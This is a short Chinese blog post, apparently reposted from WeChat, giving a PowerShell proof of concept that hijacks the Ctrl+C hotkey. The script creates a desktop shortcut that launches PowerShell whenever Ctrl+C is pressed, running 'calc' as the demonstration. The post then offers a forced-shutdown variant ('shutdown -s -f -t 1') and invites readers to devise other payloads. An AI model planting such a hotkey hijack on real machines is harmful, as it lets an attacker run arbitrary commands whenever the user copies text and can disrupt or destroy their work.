# 用Powershell劫持Windows系统快捷键

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAxMjE3ODU3MQ==&mid=2650444282&idx=2&sn=d082ad46e00bc5a835f8aa91dbb55e17&chksm=83bbf41eb4cc7d0861e0f3a78f9e464cdc667d688d49e57a26b82ac60774332fb73b22f3646a&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650444282&idx=2&sn=d082ad46e00bc5a835f8aa91dbb55e17&chksm=83bbf41eb4cc7d0861e0f3a78f9e464cdc667d688d49e57a26b82ac60774332fb73b22f3646a&scene=27#wechat_redirect)

![](../Images/bfdb8e6b5064b2f16eba66e913995d58.png)

  

POC：  
$WshShell = New-Object -comObject WScript.Shell$Shortcut = $WshShell.CreateShortcut("desktop\\desktoppayload.lnk")$Shortcut.TargetPath = "%SystemRoot%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"$Shortcut.IconLocation = "%SystemRoot%\\System32\\Shell32.dll,21"$Shortcut.hotkey = "ctrl c"$Shortcut.Arguments = 'calc'$Shortcut.Save()  
  
把poc复制到powershell里执行  
  
然后桌面会多出一个快捷方式  
  
![](../Images/63977435bc2ff8b7555872d9ed4a34b9.png)   
  
这时按ctrl c会弹出计算器  
  
我们还可以修改成其他功能  
  
在$Shortcut.Arguments = 'calc'   
  
如果要关机就改成 $Shortcut.Arguments = 'shutdown －s -f -t 1'  
  
不想劫持的话删掉快捷方式即可  
  
思路还有好多，大家自由发挥~~
